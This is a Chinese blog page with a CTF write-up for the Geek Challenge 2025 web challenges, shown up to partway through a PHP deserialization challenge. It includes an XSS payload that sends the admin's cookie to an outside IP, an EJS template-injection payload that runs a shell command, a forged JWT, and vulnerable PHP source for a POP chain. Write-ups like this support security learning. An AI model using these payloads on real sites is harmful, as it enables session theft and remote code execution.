<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Hexo Theme Redefine"><meta name="author" content="tiran"><script>!function(){const e="dark";function t(t){const o=t===e,c=document.documentElement;c.setAttribute("data-theme",t),c.classList.add(t),c.classList.remove(o?"light":e),c.style.colorScheme=t}const o=function(){try{const t=localStorage.getItem("REDEFINE-THEME-STATUS");if(t){const{isDark:o}=JSON.parse(t);return o?e:"light"}}catch(e){}return matchMedia("(prefers-color-scheme: dark)").matches?e:"light"}();t(o),matchMedia("(prefers-color-scheme: dark)").addEventListener("change",({matches:o})=>{localStorage.getItem("REDEFINE-THEME-STATUS")||t(o?e:"light")}),"loading"!==document.readyState?document.body.classList.add(o+"-mode"):document.addEventListener("DOMContentLoaded",()=>{document.body.classList.add(o+"-mode"),document.body.classList.remove((o===e?"light":e)+"-mode")})}()</script><style>:root[data-theme=dark]{--background-color:#202124;--background-color-transparent:rgba(32, 33, 36, 0.6);--second-background-color:#2d2e32;--third-background-color:#34353a;--third-background-color-transparent:rgba(32, 33, 36, 0.6);--primary-color:#0066CC;--first-text-color:#ffffff;--second-text-color:#eeeeee;--third-text-color:#bebec6;--fourth-text-color:#999999;--default-text-color:#bebec6;--invert-text-color:#373D3F;--border-color:rgba(255, 255, 255, 0.08);--selection-color:#0066CC;--shadow-color-1:rgba(255, 255, 255, 0.08);--shadow-color-2:rgba(255, 255, 255, 0.05)}:root[data-theme=light]{--background-color:#fff;--background-color-transparent:rgba(255, 255, 255, 0.6);--second-background-color:#f8f8f8;--third-background-color:#f2f2f2;--third-background-color-transparent:rgba(241, 241, 241, 0.6);--primary-color:#0066CC;--first-text-color:#16171a;--second-text-color:#2f3037;--third-text-color:#5e5e5e;--fourth-text-color:#eeeeee;--default-text-color:#373D3F;--invert-text-color:#bebec6;--border-color:rgba(0, 0, 0, 0.08);--selection-color:#0066CC;--shadow-color-1:rgba(0, 0, 0, 0.08);--shadow-color-2:rgba(0, 0, 0, 0.05)}body{background-color:var(--background-color);color:var(--default-text-color)}:root[data-theme=dark] body{background-color:var(--background-color);color:var(--default-text-color)}</style><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://evan.beee.top" crossorigin><link rel="canonical" href="https://www.tiran.cc/2025/11/29/极客大挑战2025wp/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey."><meta property="og:type" content="article"><meta property="og:title" content="极客大挑战2025wp"><meta property="og:url" content="https://www.tiran.cc/2025/11/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025wp/index.html"><meta property="og:site_name" content="tiran&#39;s blog"><meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.tiran.cc/images/redefine-og.webp"><meta property="article:published_time" content="2025-11-29T12:28:47.000Z"><meta property="article:modified_time" content="2025-12-23T06:13:12.089Z"><meta property="article:author" content="tiran"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.tiran.cc/images/redefine-og.webp"><link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/images/redefine-favicon.svg"><title>极客大挑战2025wp | tiran&#39;s blog</title><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fonts/Chillax/chillax.css"><script data-swup-reload-script defer src="/js/1.js" data-website-id="d78f4204-6915-41ea-907c-826d336a562f"></script><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/css/build/tailwind.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fonts/Geist/geist.css"><script id="hexo-configurations">window.config={hostname:"www.tiran.cc",root:"/",language:"zh-CN"},window.theme={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,delete_mask:!1,title_alignment:"left",headings_top_spacing:{h1:"3.2rem",h2:"2.4rem",h3:"1.9rem",h4:"1.6rem",h5:"1.4rem",h6:"1.3rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!1,list:[]},code_block:{copy:!0,style:"mac",highlight_theme:{light:"github",dark:"vs2015"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:{enable:!0,default:"cc_by_nc_sa"},lazyload:!0,pangu_js:!1,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/wallhaven-wqery6-light.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"light"},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://cn.vercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!1,custom_message:null},side_tools:{gear_rotation:!0,auto_expand:!1},open_graph:{enable:!0,image:"/images/redefine-og.webp",description:"Hexo Theme Redefine, Redefine Your Hexo Journey."},google_analytics:{enable:!1,id:null}},home_banner:{enable:!0,style:"fixed",image:{light:"/images/wallhaven-wqery6-light.webp",dark:"/images/wallhaven-wqery6-dark.webp"},title:"tiran's blog",subtitle:{text:["能getshell却get不到她的心......"],hitokoto:{enable:!0,show_author:!1,api:"https://v1.hitokoto.cn?c=j"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!1,smart_backspace:!1},text_color:{light:"#fff",dark:"#d1d1b6"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!0,style:"default",links:{github:"https://github.com/tiranbge/",instagram:null,zhihu:null,twitter:null,email:"2118964875@qq.com",qq:"https://qm.qq.com/q/9ORI3XUm2",weixin:"https://u.wechat.com/MNOzZ7_wNuZVsuQ3ktL4X9k?s=2",steam:"https://steamcommunity.com/profiles/76561199509050328/"},qrs:{weixin:null}}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null,lrc:null}]},mermaid:{enable:!1,version:"11.4.1"}},version:"2.8.5",navbar:{auto_hide:!1,color:{left:"#f78736",right:"#367df7",transparency:35},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-regular fa-house"},Friends:{icon:"fa-solid fa-link",path:"/links/"},Archives:{path:"/archives/",icon:"fa-regular fa-archive"},"统计":{icon:"fa-solid fa-arrow-up-right-from-square",path:"https://cloud.umami.is/share/ict20lsTMKWZK2cq/www.tiran.cc"}},search:{enable:!1,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:null,show_on_mobile:!0,links:null},article_date_format:"YYYY-MM-DD",excerpt_length:200,categories:{enable:!0,limit:3},tags:{enable:!0,limit:3}},footerStart:"2025/5/31 00:00:00"},window.lang_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},window.data={masonry:!1}</script><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fontawesome/brands.min.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fontawesome/solid.min.css"><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/fontawesome/regular.min.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span></div><main class="page-container" id="swup"><div class="main-content-container flex flex-col justify-between min-h-dvh"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content transition-navbar"><div class="left"><a class="logo-title" href="/">tiran&#39;s blog</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house fa-fw"></i> 首页</a></li><li class="navbar-item"><a href="/links/"><i class="fa-solid fa-link fa-fw"></i> 友情链接</a></li><li class="navbar-item"><a href="/archives/"><i class="fa-regular fa-archive fa-fw"></i> 归档</a></li><li class="navbar-item"><a target="_blank" rel="noopener" href="https://cloud.umami.is/share/ict20lsTMKWZK2cq/www.tiran.cc"><i class="fa-solid fa-arrow-up-right-from-square fa-fw"></i> 统计</a></li></ul></div><div class="mobile"><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>首页 </span><i class="fa-regular fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/links/"><span>友情链接 </span><i class="fa-solid fa-link fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/archives/"><span>归档 </span><i class="fa-regular fa-archive fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" target="_blank" rel="noopener" href="https://cloud.umami.is/share/ict20lsTMKWZK2cq/www.tiran.cc"><span>统计 </span><i class="fa-solid fa-arrow-up-right-from-square fa-sm fa-fw"></i></a></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div><div class="label text-third-text-color text-sm">标签</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div><div class="label text-third-text-color text-sm">分类</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div><div class="label text-third-text-color text-sm">文章</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body transition-fade-up"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><div class="w-full flex items-center pt-6 justify-start"><h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">极客大挑战2025wp</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="/images/tiran.jpg"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">tiran</span> <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2025-11-29 20:28:47</span> <span class="mobile">2025-11-29 20:28:47</span> <span class="hover-info">创建</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2025-12-23 14:13:12</span> <span class="mobile">2025-12-23 14:13:12</span> <span class="hover-info">更新</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web-阿基里斯追乌龟"><a href="#web-阿基里斯追乌龟" class="headerlink" title="web-阿基里斯追乌龟"></a>web-阿基里斯追乌龟</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105180446873.png"></p><p>控制台改值（抓包改也可以</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105180514079.png"></p><h3 id="web-Vibe-SEO"><a href="#web-Vibe-SEO" class="headerlink" title="web-Vibe SEO"></a>web-Vibe SEO</h3><p>题目提示站点地图，sitemap</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105180640253.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105180724230.png"></p><p>提示缺少filename参数，传他自己</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105181005262.png"></p><p>拿到源码</p><p>由于<code>my_my_secret.txt</code>已经使用<code>fopen</code>打开，使用我们可以在fd文件中找到</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105182559433.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105182535454.png"></p><h3 id="web-Xross-The-Finish-Line"><a href="#web-Xross-The-Finish-Line" class="headerlink" title="web-Xross The Finish Line"></a>web-Xross The Finish Line</h3><p>是一个留言板，xss盗管理员cookie</p><p>没有过滤svg标签，过滤空格用%09绕过，单引号使用html编码</p><p>payload</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=&lt;svg%09onload=fetch(%26%23x27%3bhttp://47.xxx.xxx.xxx/?jkdtz=%26%23x27%3b%2bdocument.cookie)&gt;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105184327498.png"></p><h3 id="web-Expression"><a href="#web-Expression" class="headerlink" title="web-Expression"></a>web-Expression</h3><p>随便注册一个账号，登陆发现回显了用户名，并且使用jwt</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105184526688.png"></p><p>爆破密钥</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105184743793.png"></p><p>修改用户名</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105184907391.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105184858738.png"></p><p>存在ssti，没过滤</p><p>payload</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;) %&gt;</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjFAcXEuY29tIiwidXNlcm5hbWUiOiI8JS0gZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2VudicpICU-IiwiaWF0IjoxNzYyMzM5NDk5LCJleHAiOjE3NjI5NDQyOTl9.SIX4jzC7kAGdZ2Q3niXnwbmrHcUZEPPiCLc9qiKdUJQ</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105185030155.png"></p><h3 id="web-popself"><a href="#web-popself" class="headerlink" title="web-popself"></a>web-popself</h3><p>给出源码</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">All_in_one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KiraKiraAyu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_4ak5ra</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$K4per</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Sams</span>āra;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$komiko</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Fox</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Eureka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QYQS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sleep3r</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ivory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他还是没有忘记那个&quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;收集夏日的碎片吧&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fox</span> = <span class="variable language_">$this</span>-&gt;Fox;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="variable">$fox</span> <span class="keyword">instanceof</span> All_in_one) &amp;&amp; <span class="variable">$fox</span>()===<span class="string">&quot;summer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;QYQS enjoy summer&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$komiko</span> = <span class="variable language_">$this</span>-&gt;komiko;</span><br><span class="line">            <span class="variable">$komiko</span>-&gt;<span class="title function_ invoke__">Eureka</span>(<span class="variable">$this</span>-&gt;L, <span class="variable">$this</span>-&gt;sleep3r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;恭喜成功signin!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome to Geek_Challenge2025!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;Samsāra;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="variable language_">$this</span>-&gt;ivory;</span><br><span class="line">        <span class="variable">$f</span>(<span class="variable">$arg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你能让K4per和KiraKiraAyu组成一队吗&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;K4per)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))===<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;boys和而不同&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))==<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOY♂ sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;QYQS-&gt;partner = <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOY♂ can`t sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu)).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;boys堂堂正正&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再走一步...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;_4ak5ra;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span>&#123;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$args</span>[<span class="number">0</span>])&lt;<span class="number">4</span> &amp;&amp; (<span class="variable">$args</span>[<span class="number">0</span>]+<span class="number">1</span>)&gt;<span class="number">10000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;再走一步&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$args</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你要努力进窄门&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">find_myself</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;24_SYC.zip&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有大家的压缩包的话，瓦达西！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>首先他有一个MD5比较</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你能让K4per和KiraKiraAyu组成一队吗&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;K4per)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))===<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;boys和而不同&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))==<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;BOY♂ sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">            